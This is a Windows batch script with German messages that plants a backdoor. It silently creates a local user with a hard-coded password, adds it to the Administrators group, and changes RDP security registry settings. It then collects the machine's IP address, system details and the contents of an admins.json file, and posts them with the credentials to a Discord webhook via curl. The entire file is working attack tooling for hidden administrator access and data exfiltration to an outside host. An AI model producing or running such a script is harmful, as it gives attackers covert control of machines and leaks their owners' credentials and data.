@echo off
setlocal EnableDelayedExpansion
set WEBHOOK_URL=webhook-discord-link

set BENUTZERNAME=cache
set PASSWORT=Passw0rt#

net user %BENUTZERNAME% %PASSWORT% /add >nul 2>&1
if not %errorlevel%==0 (
    echo Fehler beim Erstellen des Benutzers '%BENUTZERNAME%'.
    exit /b 1
) else (
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f >nul 2>&1
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f >nul 2>&1

    net localgroup Administratoren %BENUTZERNAME% /add >nul 2>&1
    net localgroup Administrators %BENUTZERNAME% /add >nul 2>&1
    net localgroup Administrator %BENUTZERNAME% /add >nul 2>&1
    if not %errorlevel%==0 (
        echo Fehler beim Hinzufügen des Benutzers '%BENUTZERNAME%' zur Administratorengruppe.
        exit /b 1
    ) else (
        for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr "IPv4"') do (
            set "IP=%%a"
        )
        set "IP=!IP: =!"

        for /f "delims=" %%b in ('systeminfo ^| findstr /C:"Betriebssystemname" /C:"Betriebssystemversion" /C:"Systemhersteller"') do (
            set "SERVER_INFO=!SERVER_INFO!%%b\n"
        )

        set "FILE_CONTENT="
        if exist "admins.json" (
            setlocal DisableDelayedExpansion
            for /f "usebackq delims=" %%f in ("admins.json") do (
                set "FILE_CONTENT=!FILE_CONTENT!%%f\n"
            )
            endlocal
        )

        set "TIME=%TIME%"

        set "JSON_PAYLOAD={\"embeds\":[{\"title\":\"Neue Benutzererstellung\",\"description\":\"Es wurde ein neuer Benutzer erstellt.\",\"color\":16711680,\"fields\":[{\"name\":\"Benutzername\",\"value\":\"%BENUTZERNAME%\"},{\"name\":\"Passwort\",\"value\":\"%PASSWORT%\"},{\"name\":\"IP-Adresse\",\"value\":\"!IP!\"},{\"name\":\"Grund\",\"value\":\"Fuer die Erstellung des Benutzers\"},{\"name\":\"Server Informationen\",\"value\":\"!SERVER_INFO!\"},{\"name\":\"admins.json\",\"value\":\"!FILE_CONTENT!\"}],\"footer\":{\"text\":\"Uhrzeit: %TIME%\"}}]}"
        curl.exe -s -H "Content-Type: application/json" -X POST -d "!JSON_PAYLOAD!" %WEBHOOK_URL% >nul

        echo Der Benutzer '%BENUTZERNAME%' wurde erfolgreich erstellt und zur Administratorengruppe hinzugefügt.
    )
)
